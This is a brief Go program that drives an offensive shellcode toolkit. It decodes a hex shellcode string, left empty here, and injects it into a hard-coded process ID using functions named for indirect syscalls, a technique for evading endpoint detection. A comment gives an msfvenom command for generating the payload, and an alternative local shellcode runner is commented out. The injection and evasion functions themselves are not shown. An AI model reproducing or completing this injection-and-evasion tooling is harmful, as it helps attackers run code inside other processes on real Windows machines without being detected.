package main

import (
	"encoding/hex"
	"fmt"
)

func main() {

	//msfvenom -p windows/x64/exec CMD=calc.exe -f hex

	// Shellcode Runner using indirect syscalls

	sc, _ := hex.DecodeString("")

	/*err := ShellcodeRunnerSyscalls(sc, true, true)
	if err != nil {
		fmt.Print(err)
	}*/

	// Shellcode Runner using indirect syscalls

	err := ShellcodeInjectorSyscalls(28456, sc, true, true) //replace with the right PID
	if err != nil {
		fmt.Print(err)
	}

}
